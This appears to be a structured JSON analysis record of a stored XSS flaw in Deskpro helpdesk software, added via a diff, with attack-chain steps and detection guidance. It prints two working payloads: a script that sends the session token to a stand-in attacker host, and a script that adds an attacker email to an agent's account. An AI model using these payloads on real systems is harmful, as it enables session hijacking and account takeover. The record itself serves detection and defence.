@@ -1,0 +1,112 @@
+{
+  "package_info": {
+    "package_name": "Deskpro",
+    "package_manager": "N/A (proprietary web application)",
+    "package_versions": "2020.2.9 (Docker and Cloud), likely earlier versions as well",
+    "why_malicious": "The Deskpro application contains a stored cross-site scripting (XSS) vulnerability that allows attackers to inject and execute arbitrary JavaScript in the browser context of admins and agents. This enables session hijacking, privilege escalation, and account takeover, resulting in full compromise of helpdesk data and configuration."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "When an admin or agent loads the 'Ticket Insights' dashboard (runtime, upon page visit)",
+        "file_location": "Request payload to /portal/api/auth/session endpoint (meta.pageTitle property), rendered in dashboard widget",
+        "required_permissions": [
+          "network access (to make outbound HTTP requests)",
+          "browser DOM access (to read global variables)"
+        ]
+      },
+      "code_snippet": "<script>fetch('https://attacker.com/steal?token='+DESKPRO_SESSION_CODE)</script>",
+      "code_language": "javascript",
+      "code_behavior": "When an admin or agent loads the 'Ticket Insights' dashboard, the code executes in the browser context, accesses the DESKPRO_SESSION_CODE global variable, and sends its value to an attacker-controlled domain via an HTTP request, enabling session hijacking.",
+      "malice_analysis": {
+        "why_suspicious": "The code exfiltrates a sensitive session token (DESKPRO_SESSION_CODE) to an external server controlled by the attacker, which is a clear indicator of credential theft and session hijacking.",
+        "violated_expectations": "User-supplied data (such as pageTitle) should be treated as plain text and properly escaped before rendering in the DOM. Executing user input as JavaScript violates secure coding practices and enables XSS attacks.",
+        "similar_legitimate_use": "Legitimate analytics scripts may collect page titles for tracking, but they do not execute user-supplied data as code or access and transmit session tokens to external domains.",
+        "key_indicators": [
+          "Direct access to global session variable (DESKPRO_SESSION_CODE) in the browser DOM",
+          "Outbound HTTP request to attacker-controlled domain (https://attacker.com/steal)",
+          "Execution of user-supplied data as JavaScript via <script> tag injection",
+          "Presence of <script> tags in database fields intended for display"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "When an agent loads the 'Ticket Insights' dashboard (runtime, upon page visit)",
+        "file_location": "Request payload to /portal/api/auth/session endpoint (meta.pageTitle property), rendered in dashboard widget",
+        "required_permissions": [
+          "network access (to make internal POST requests)",
+          "browser DOM access (to read DP_REQUEST_TOKEN)"
+        ]
+      },
+      "code_snippet": "<script>fetch('/agent/account/emails/add', {method:'POST',body:'email=attacker@somehost.com&_rt='+DP_REQUEST_TOKEN,headers:{'Content-Type':'application/x-www-form-urlencoded'}})</script>",
+      "code_language": "javascript",
+      "code_behavior": "When an agent loads the 'Ticket Insights' dashboard, the code executes in the browser context, retrieves the DP_REQUEST_TOKEN from the DOM, and sends a POST request to the internal /agent/account/emails/add endpoint to add the attacker's email address to the agent's account, enabling account takeover.",
+      "malice_analysis": {
+        "why_suspicious": "The code silently performs an unauthorized modification of the agent's account by adding a new email address, leveraging the DP_REQUEST_TOKEN for CSRF-like exploitation without user interaction.",
+        "violated_expectations": "User-supplied data should never be executed as code, nor should it be able to trigger sensitive account changes without explicit user action and re-authentication. Proper CSRF protections and output encoding are expected.",
+        "similar_legitimate_use": "Legitimate account management scripts may update email addresses, but only after explicit user interaction and proper authentication, never via execution of user-supplied data.",
+        "key_indicators": [
+          "Use of request token (DP_REQUEST_TOKEN) from DOM to bypass CSRF protections",
+          "Silent POST request to /agent/account/emails/add endpoint from dashboard context",
+          "Execution of user-supplied data as JavaScript via <script> tag injection",
+          "Modification of account settings without user consent or interaction"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker crafts a malicious payload in the pageTitle property of the meta object and sends it to the /portal/api/auth/session endpoint.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Payload is stored in the Deskpro database and rendered in dashboards."
+    },
+    {
+      "step": 2,
+      "action": "Admin or agent opens the 'Ticket Insights' dashboard, triggering the stored XSS payload to execute in their browser context.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Malicious JavaScript executes with the victim's privileges."
+    },
+    {
+      "step": 3,
+      "action": "For admin session hijacking: The script exfiltrates the DESKPRO_SESSION_CODE to the attacker's server.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Attacker hijacks the admin session and gains full system access."
+    },
+    {
+      "step": 4,
+      "action": "For agent account takeover: The script adds the attacker's email to the agent's account using the DP_REQUEST_TOKEN.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker initiates password reset and takes over the agent's account."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Execution of user-supplied data as JavaScript in dashboard widgets (e.g., Top KB Views, Ticket Insights)",
+      "Unexpected outbound network requests to external domains from admin/agent dashboard pages",
+      "Silent modification of account email addresses via background POST requests from dashboard context"
+    ],
+    "file_indicators": [
+      "Unescaped or unencoded user input rendered in dashboard widgets, especially in meta.pageTitle fields",
+      "Presence of <script> tags or suspicious JavaScript code in pageTitle or similar fields in the Deskpro database"
+    ],
+    "network_indicators": [
+      "Outbound HTTP/HTTPS requests to unknown or attacker-controlled domains (e.g., https://attacker.com/steal) from Deskpro admin/agent sessions",
+      "Unusual POST requests to /agent/account/emails/add originating from dashboard pages without corresponding user actions"
+    ],
+    "how_to_detect": "Monitor for script execution in dashboard widgets, particularly where user-supplied data is rendered. Inspect network traffic from admin and agent sessions for requests to external domains or unauthorized internal API calls (such as adding emails). Audit database fields for embedded <script> tags or suspicious JavaScript. Implement a strict Content Security Policy (CSP) with nonces to block inline scripts, and enforce output encoding/escaping for all user-supplied data to prevent XSS."
+  }
+}
